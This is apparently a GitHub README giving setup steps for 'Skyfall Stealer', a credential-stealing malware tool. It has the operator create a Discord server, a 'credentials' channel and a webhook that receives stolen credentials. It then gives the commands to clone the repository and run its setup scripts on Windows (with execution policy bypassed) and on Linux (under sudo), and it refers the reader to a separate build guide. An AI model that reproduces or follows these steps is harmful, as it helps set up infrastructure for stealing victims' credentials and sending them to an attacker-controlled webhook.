# Setup Guide for the Skyfall Stealer 
Please follow the following steps to setup Skyfall.

 ## Step 1# Create the Server

You need to create a Discord server. 

Click on plus icon on discord left bar, give your server a name and click on the "Create" button.

![image](https://i.ibb.co/z2Q2cJn/server.png)

## Step 2# Create text channel

You need to create a Credentials channel. 

Click on your server left bar with right mouse button, click on "Create Channel", name it "credentials" and click on "Create Channel".

![image](https://i.ibb.co/Sr7ZK44/credentials.png)

## Step 3# Create the Webhook

You need to create Discord Webhook from your **Servers Settings >> Intergrations >> Webhooks.**

- Name it "Skyfall" and set it's channel to **"credentials"**

![image](https://i.ibb.co/ryz1bNg/webhook.png)

## Step 4# Install the Skyfall Stealer

You need to clone the repository, cd into the cloned project files, run a command to change the permissions of the setup file and run it.
```
git clone https://github.com/3ct0s/skyfall-stealer.git
cd skyfall-stealer
```
### Windows
```
powershell.exe -ExecutionPolicy Bypass -Command .\setup-files\setup-win.ps1
```
### Linux
```
sed $'s/\r$//' ./setup-files/setup-lin.sh > ./setup-files/setup-lin-new.sh
chmod +x ./setup-files/setup-lin-new.sh
sudo ./setup-files/setup-lin-new.sh
```

On Linux you will be asked to say **yes** or **no** while installing the needed dependencies. Make sure you select **yes** and press enter.

![image](https://i.ibb.co/GVHVYdZ/Capture.png)

Once you are done with the installation you can move to the next step which is building.

## Build a Skyfall Stealer

Follow the [build guide](BUILD.md) to build a skyfall stealer.
